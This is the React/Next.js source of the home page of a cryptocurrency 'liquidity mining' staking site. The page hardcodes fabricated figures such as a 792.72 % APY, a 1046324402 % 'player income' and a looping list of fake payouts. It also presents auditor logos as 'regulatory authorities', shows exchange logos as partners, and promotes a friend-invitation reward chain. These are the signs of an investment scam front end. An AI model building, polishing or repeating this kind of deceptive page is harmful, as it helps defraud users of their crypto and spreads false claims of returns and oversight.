'use client'

import { Button } from '@/components/ui/button'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { Avatar, AvatarImage, AvatarFallback } from '@/components/ui/avatar'
import { RefreshCWIcon } from '@/components/RefreshCWIcon'
import { CounterAnimation } from '@/components/CounterAnimation'
import { ParticleBackground } from '@/components/ParticleBackground'
import { EnhancedButton } from '@/components/EnhancedButton'
import { WalletStatus } from '@/components/WalletConnector'
import { PriceChart } from '@/components/charts/PriceChart'
import { useCryptoPrices, useEthereumPrice } from '@/hooks/useData'
import { useState } from 'react'
import Link from 'next/link'

export default function Home() {
  const [faqOpen, setFaqOpen] = useState(false)
  const { data: cryptoPrices, isLoading: pricesLoading } = useCryptoPrices()
  const { data: ethPrice, isLoading: ethLoading } = useEthereumPrice()

  const ethData = cryptoPrices?.find(coin => coin.id === 'ethereum')
  const currentEthPrice = ethPrice || ethData?.current_price || 2557.84

  return (
    <div className="min-h-screen bg-background relative">
      <ParticleBackground />
      {/* Header */}
      <header className="flex items-center justify-between p-4 frosted-glass border-b border-border/20 text-[#000000] bg-[#f9f900] font-bold">
        <div className="flex items-center gap-2 slide-in-up">
          <img src="https://ext.same-assets.com/590002659/3894291359.png" alt="English" className="w-5 h-5" />
          <span className="text-sm text-muted-foreground">English</span>
        </div>
        <WalletStatus />
      </header>

      {/* Hero Section */}
      <section className="relative py-8 px-4 binance-gradient">
        <div className="max-w-6xl mx-auto">
          <div className="flex justify-center">
            <div className="relative floating">
              <img
                src="https://ext.same-assets.com/590002659/4237015767.jpeg"
                alt="Mining Graphics"
                className="w-full max-w-2xl mx-auto rounded-2xl shadow-2xl transition-transform duration-300 hover:scale-105"
              />
            </div>
          </div>
        </div>
      </section>

      {/* Main Stats Section */}
      <section className="py-8 px-4">
        <div className="max-w-4xl mx-auto">
          {/* Single Unified Stats Card */}
          <Card className="frosted-glass rounded-2xl shadow-2xl stats-card">
            <CardContent className="p-6 rounded-[17px] bg-[#171717]">
              {/* Top Row: ETH Display + Join Button */}
              <div className="flex justify-between items-center mb-6">
                <div className="slide-in-up">
                  <div className="text-4xl font-bold text-white mb-1">
                    <CounterAnimation end={0} decimals={2} className="counter-text" />
                  </div>
                  <div className="text-base text-muted-foreground">ETH</div>
                </div>
                <EnhancedButton className="text-black hover:bg-primary/90 font-bold bg-[#eab308] rounded-[24px] text-[19px] px-[30px] py-[25px]">
                  参加
                </EnhancedButton>
              </div>

              {/* Middle Row: Three Stats with clear separation */}
              <div className="grid grid-cols-3 gap-0 mb-6 border-t border-b border-border/20 py-4">
                <div className="text-left border-r border-border/20 pr-4 slide-in-up">
                  <div className="text-xs text-muted-foreground mb-1">收益池</div>
                  <div className="text-sm font-bold text-[#eab308] counter-text">144129961.86 ETH</div>
                </div>
                <div className="text-center border-r border-border/20 px-4 slide-in-up" style={{ animationDelay: '0.2s' }}>
                  <div className="text-xs text-muted-foreground mb-1">玩家收入</div>
                  <div className="text-sm font-bold text-green-400 counter-text">1046324402.00 %</div>
                </div>
                <div className="text-right pl-4 slide-in-up" style={{ animationDelay: '0.4s' }}>
                  <div className="text-xs text-muted-foreground mb-1">ETH 兑换</div>
                  <div className="text-sm font-bold text-[#00ffff]">
                    {ethLoading ? (
                      <div className="animate-pulse">Loading...</div>
                    ) : (
                      <CounterAnimation end={currentEthPrice} decimals={2} suffix=" USDT" className="counter-text" />
                    )}
                  </div>
                </div>
              </div>

              {/* Bottom Row: Two Stats with clear separation */}
              <div className="grid grid-cols-2 gap-0">
                <div className="border-r border-border/20 pr-4 slide-in-up" style={{ animationDelay: '0.6s' }}>
                  <div className="text-xs text-muted-foreground mb-1">钱包余额:</div>
                  <div className="flex items-center gap-2">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 32 32" className="inline slow-spin">
                      <linearGradient id="wallet-grad1" x1="16" x2="16" y1="5.25" y2="27.432" gradientUnits="userSpaceOnUse">
                        <stop offset="0" stopColor="#66c4c4" />
                        <stop offset="1" stopColor="#009393" />
                      </linearGradient>
                      <path fill="url(#wallet-grad1)" fillRule="evenodd" d="M7.534,5.313h17.28c0.412,0,0.793,0.214,0.999,0.56	l5.034,8.486c0.261,0.44,0.183,0.996-0.189,1.352l-13.857,13.28c-0.449,0.43-1.171,0.43-1.62,0L1.342,15.73	c-0.381-0.365-0.452-0.937-0.172-1.38l5.381-8.504C6.761,5.515,7.133,5.313,7.534,5.313z" clipRule="evenodd" />
                      <linearGradient id="wallet-grad2" x1="16" x2="16" y1="5.313" y2="29.314" gradientUnits="userSpaceOnUse">
                        <stop offset="0" stopOpacity=".02" />
                        <stop offset="1" stopOpacity=".15" />
                      </linearGradient>
                      <path fill="url(#wallet-grad2)" d="M30.846,14.359l-5.034-8.486	c-0.206-0.347-0.587-0.56-0.999-0.56H7.534c-0.401,0-0.773,0.202-0.982,0.533L1.17,14.35c-0.28,0.443-0.209,1.015,0.172,1.38	l13.838,13.262c0.224,0.215,0.517,0.323,0.81,0.323c0.293,0,0.586-0.108,0.81-0.323l13.857-13.28	C31.03,15.355,31.107,14.799,30.846,14.359z M30.485,15.531l-13.857,13.28c-0.17,0.163-0.397,0.253-0.637,0.253	c-0.24,0-0.467-0.09-0.637-0.253L1.515,15.549c-0.296-0.284-0.351-0.722-0.134-1.065L6.763,5.98	c0.163-0.257,0.458-0.417,0.771-0.417h17.28c0.323,0,0.624,0.168,0.784,0.438l5.034,8.486	C30.833,14.826,30.772,15.256,30.485,15.531z" />
                      <linearGradient id="wallet-grad3" x1="16.025" x2="16.025" y1="8.539" y2="22.472" gradientUnits="userSpaceOnUse">
                        <stop offset="0" stopOpacity=".02" />
                        <stop offset="1" stopOpacity=".15" />
                      </linearGradient>
                      <path fill="url(#wallet-grad3)" d="M17.91,12.585V11.42h4.672	c0.138,0,0.25-0.112,0.25-0.25V8.789c0-0.138-0.112-0.25-0.25-0.25H9.469c-0.138,0-0.25,0.112-0.25,0.25v2.381	c0,0.138,0.112,0.25,0.25,0.25h4.673v1.165c-2.837,0.168-6.043,0.783-6.07,2.006v1.816c0.027,1.216,3.233,1.831,6.07,2v3.814	c0,0.138,0.112,0.25,0.25,0.25h3.269c0.138,0,0.25-0.112,0.25-0.25v-3.814c2.837-0.169,6.043-0.785,6.069-2.006v-1.815	C23.953,13.368,20.747,12.753,17.91,12.585z M16.025,16.677c-3.619,0-6.253-0.581-7.141-1.181c0.692-0.471,2.479-0.961,5.257-1.126	v1.464c0,0.133,0.104,0.243,0.237,0.25c1.057,0.055,2.235,0.055,3.294,0c0.133-0.007,0.237-0.117,0.237-0.25V14.37	c2.778,0.165,4.563,0.655,5.257,1.126C22.278,16.096,19.646,16.677,16.025,16.677z" />
                      <path fill="#fff" fillRule="evenodd" d="M17.66,12.821V11.17h4.922V8.789H9.469v2.381h4.922v1.651	c-3.457,0.176-6.051,0.901-6.07,1.77l0,1.811c0.019,0.869,2.613,1.593,6.07,1.77v4.051h3.268V18.17	c3.457-0.176,6.051-0.901,6.07-1.77l0-1.811C23.711,13.722,21.117,12.997,17.66,12.821z M16.026,16.927	c-3.689,0-6.773-0.613-7.528-1.431c0.64-0.694,2.955-1.24,5.893-1.39v1.728c0.527,0.027,1.073,0.041,1.634,0.041	c0.561,0,1.108-0.014,1.634-0.041v-1.728c2.939,0.15,5.253,0.696,5.893,1.39C22.799,16.314,19.715,16.927,16.026,16.927z" clipRule="evenodd" />
                    </svg>
                    <span className="text-lg font-bold text-white">
                      <CounterAnimation end={0} decimals={2} suffix=" USDT" className="counter-text" />
                    </span>
                    <RefreshCWIcon size={16} className="text-muted-foreground" />
                  </div>
                </div>
                <div className="pl-4 slide-in-up" style={{ animationDelay: '0.8s' }}>
                  <div className="text-xs text-muted-foreground mb-1">质押APY:</div>
                  <div className="flex items-center gap-2">
                    <Badge className="bg-blue-600 text-white text-sm px-3 py-1 font-bold rounded transition-all duration-300 hover:bg-blue-500 hover:scale-105 counter-text">
                      792.72 %
                    </Badge>
                    <RefreshCWIcon size={16} className="text-muted-foreground" />
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </section>

      {/* Liquidity Mining Data */}
      <section className="py-8 px-4 frosted-glass-light rounded-[18px] mx-4">
        <div className="max-w-6xl mx-auto">
          <h3 className="text-2xl font-bold text-center mb-8 gold-text slide-in-up">Liquidity Mining Data</h3>

          <div className="grid grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
            <Card className="frosted-glass text-center floating" style={{ animationDelay: '0s' }}>
              <CardContent className="p-6">
                <div className="mb-2 text-[#ff8000] text-[24px]">Total Production</div>
                <div className="text-lg font-semibold text-[#ffffff]">
                  <CounterAnimation end={33750006.385} decimals={3} suffix=" USDT" className="counter-text" />
                </div>
              </CardContent>
            </Card>

            <Card className="frosted-glass text-center floating" style={{ animationDelay: '1s' }}>
              <CardContent className="p-6">
                <div className="mb-2 text-[24px] text-[#8080ff]">Effective Nodes</div>
                <div className="text-lg font-semibold text-[#ffffff]">
                  <CounterAnimation end={17903781.626} decimals={3} className="counter-text" />
                </div>
              </CardContent>
            </Card>

            <Card className="frosted-glass text-center floating" style={{ animationDelay: '2s' }}>
              <CardContent className="p-6">
                <div className="mb-2 text-[#00ffff] text-[23px]">Participant Number</div>
                <div className="text-lg font-semibold text-[#ffffff]">
                  <CounterAnimation end={478371} className="counter-text" />
                </div>
              </CardContent>
            </Card>

            <Card className="frosted-glass text-center floating" style={{ animationDelay: '3s' }}>
              <CardContent className="p-6">
                <div className="mb-2 text-[24px] text-[#ff0000]">User Income</div>
                <div className="text-lg font-semibold text-[#ffffff]">
                  <CounterAnimation end={1963100869.294} decimals={3} suffix=" USDT" className="counter-text" />
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </section>

      {/* Liquidity Mining Output */}
      <section className="py-8 px-4">
        <div className="max-w-6xl mx-auto">
          {/* Title outside card */}
          <h3 className="text-2xl font-bold text-center mb-8 gold-text">Liquidity Mining Output</h3>

          {/* Headers outside card */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-2 text-sm mb-4">
            <div className="font-semibold text-muted-foreground">Address</div>
            <div className="font-semibold text-muted-foreground text-right">Amount</div>
          </div>

          {/* Card with scrollable content */}
          <div className="bg-[#400040] rounded-[30px] glass-effect overflow-hidden">
            <div className="h-96 overflow-hidden relative">
              {/* Auto-scrolling content */}
              <div className="animate-scroll space-y-2 p-6">
                {[
                  { address: "T2fxbddd...fUzZjiVH", amount: "779.01USDT" },
                  { address: "0x42Fb1B...63e8A5d1", amount: "897.89USDT" },
                  { address: "0xe6Edbf...4dc3EcAA", amount: "405.1USDT" },
                  { address: "0x60DD6E...90BaD7Dd", amount: "199.78USDT" },
                  { address: "0xfDF96B...38A33e8C", amount: "422.52USDT" },
                  { address: "0xC4D2Db...4e0AB3BA", amount: "386.86USDT" },
                  { address: "T6r3T7eS...672XYuq2", amount: "99.2USDT" },
                  { address: "Tdf9xSfP...BmGmsNf9", amount: "118.4USDT" },
                  // Duplicate entries for continuous scroll effect
                  { address: "T2fxbddd...fUzZjiVH", amount: "779.01USDT" },
                  { address: "0x42Fb1B...63e8A5d1", amount: "897.89USDT" },
                  { address: "0xe6Edbf...4dc3EcAA", amount: "405.1USDT" },
                  { address: "0x60DD6E...90BaD7Dd", amount: "199.78USDT" },
                  { address: "0xfDF96B...38A33e8C", amount: "422.52USDT" },
                  { address: "0xC4D2Db...4e0AB3BA", amount: "386.86USDT" },
                  { address: "T6r3T7eS...672XYuq2", amount: "99.2USDT" },
                  { address: "Tdf9xSfP...BmGmsNf9", amount: "118.4USDT" },
                ].map((item, index) => (
                  <div key={`${item.address}-${index}`} className="grid grid-cols-2 gap-2 py-2 border-b border-border/30 transition-all duration-300 hover:bg-white/5 hover:scale-[1.02]">
                    <div className="text-muted-foreground font-mono text-sm">{item.address}</div>
                    <div className="text-right font-semibold text-primary counter-text">{item.amount}</div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* My Activity */}
      <section className="py-8 px-4">
        <div className="max-w-6xl mx-auto">
          <h3 className="text-2xl font-bold text-center mb-4 gold-text slide-in-up">My Activity</h3>
          <p className="text-center text-muted-foreground mb-8 slide-in-up" style={{ animationDelay: '0.2s' }}>
            Please enter the amount of staking corresponding to the end time
          </p>

          <div className="text-center py-12">
            <img
              src="https://ext.same-assets.com/590002659/3331183233.png"
              alt="No Data"
              className="w-24 h-24 mx-auto mb-4 opacity-50 floating"
            />
            <div className="text-muted-foreground slide-in-up">No Data</div>
          </div>
        </div>
      </section>

      {/* FAQ */}
      <section className="py-8 px-4">
        <div className="max-w-6xl mx-auto">
          {/* Title outside card */}
          <h3 className="text-2xl font-bold text-center mb-8 gold-text slide-in-up">FAQ</h3>

          <Card className="frosted-glass transition-all duration-300 hover:scale-[1.02] cursor-pointer">
            <CardContent className="p-6">
              <div className="flex items-center justify-between" onClick={() => setFaqOpen(!faqOpen)}>
                <span className="text-lg">Are there any rewards for inviting friends?</span>
                <span className={`text-primary transition-transform duration-300 ${faqOpen ? 'rotate-180' : ''}`}>▼</span>
              </div>
              {faqOpen && (
                <div className="mt-4 pt-4 border-t border-border/20 slide-in-up">
                  <p className="text-muted-foreground leading-relaxed">
                    Yes, you can invite your friends to join the mining pool through your link. You can get ETH rewards from the mining pool while participating in the friend invitation chain.
                  </p>
                </div>
              )}
            </CardContent>
          </Card>
        </div>
      </section>

      {/* Regulatory Authorities */}
      <section className="py-8 px-4">
        <div className="max-w-6xl mx-auto">
          <h3 className="text-2xl font-bold text-center mb-4 gold-text slide-in-up">Regulatory Authorities</h3>
          <p className="text-center text-muted-foreground mb-8 slide-in-up" style={{ animationDelay: '0.2s' }}>
            We have global regulatory authorities
          </p>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <Card className="frosted-glass p-6 floating">
              <img
                src="https://ext.same-assets.com/590002659/396665122.png"
                alt="FairyProof"
                className="w-full h-20 object-contain transition-transform duration-300 hover:scale-110"
              />
            </Card>
            <Card className="frosted-glass p-6 floating" style={{ animationDelay: '2s' }}>
              <img
                src="https://ext.same-assets.com/590002659/2552246351.png"
                alt="Certik"
                className="w-full h-20 object-contain transition-transform duration-300 hover:scale-110"
              />
            </Card>
            <Card className="frosted-glass p-6 floating bg-[#ffffff]" style={{ animationDelay: '4s' }}>
              <img
                src="https://ext.same-assets.com/590002659/2879882895.png"
                alt="SlowMist"
                className="w-full h-20 object-contain transition-transform duration-300 hover:scale-110"
              />
            </Card>
          </div>
        </div>
      </section>

      {/* Cooperative Platform */}
      <section className="py-8 px-4 frosted-glass-light mx-4 rounded-lg">
        <div className="max-w-6xl mx-auto">
          <h3 className="text-2xl font-bold text-center mb-8 gold-text slide-in-up">Cooperative Platform</h3>

          <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4">
            {[
              { src: "https://ext.same-assets.com/590002659/1926889768.png", alt: "Bitfinex", name: "Bitfinex" },
              { src: "https://ext.same-assets.com/590002659/3816864077.png", alt: "Okex", name: "Okex" },
              { src: "https://ext.same-assets.com/590002659/4103284146.png", alt: "Gate.io", name: "Gate.io" },
              { src: "https://ext.same-assets.com/590002659/1884424797.png", alt: "Kraken", name: "Kraken" },
              { src: "https://ext.same-assets.com/590002659/1671120861.png", alt: "LBank", name: "LBank" },
              { src: "https://ext.same-assets.com/590002659/694738711.png", alt: "Binance", name: "Binance" },
            ].map((platform, index) => (
              <Card key={platform.name} className="frosted-glass p-4 hover:bg-muted/20 transition-all duration-300 floating" style={{ animationDelay: `${index * 0.5}s` }}>
                <div className="flex flex-col items-center gap-2">
                  <img
                    src={platform.src}
                    alt={platform.alt}
                    className="w-8 h-8 transition-transform duration-300 hover:scale-125"
                  />
                  <span className="text-sm text-muted-foreground">{platform.name}</span>
                </div>
              </Card>
            ))}
          </div>
        </div>
      </section>

      {/* Bottom Navigation */}
      <nav className="fixed bottom-0 left-0 right-0 frosted-glass border-t border-border">
        <div className="flex justify-around items-center py-2">
          {[
            { src: "https://ext.same-assets.com/590002659/2588141536.png", alt: "Home", label: "Home", active: true, href: "/" },
            { src: "https://ext.same-assets.com/590002659/1667291039.png", alt: "Mining", label: "Mining", active: false, href: "/mining" },
            { src: "https://ext.same-assets.com/590002659/3073358967.png", alt: "Service", label: "Service", active: false, href: "/service" },
            { src: "https://ext.same-assets.com/590002659/855995434.png", alt: "Invite", label: "Invite", active: false, href: "/invite" },
            { src: "https://ext.same-assets.com/590002659/2669583638.png", alt: "User", label: "User", active: false, href: "/user" },
          ].map((item) => (
            <Link
              key={item.label}
              href={item.href}
              className={`flex flex-col items-center py-2 px-4 transition-all duration-300 transform hover:scale-105 active:scale-95 ${
                item.active ? 'scale-110' : ''
              }`}
            >
              <img
                src={item.src}
                alt={item.alt}
                className={`w-6 h-6 mb-1 transition-all duration-300 ${
                  item.active
                    ? 'filter brightness-0 saturate-100 contrast-200 hue-rotate-45'
                    : 'filter brightness-0 invert'
                }`}
              />
              <span className={`text-xs transition-all duration-300 ${
                item.active ? 'text-primary font-semibold' : 'text-white'
              }`}>
                {item.label}
              </span>
            </Link>
          ))}
        </div>
      </nav>

      {/* Add bottom padding to account for fixed navigation */}
      <div className="h-20" />
    </div>
  )
}
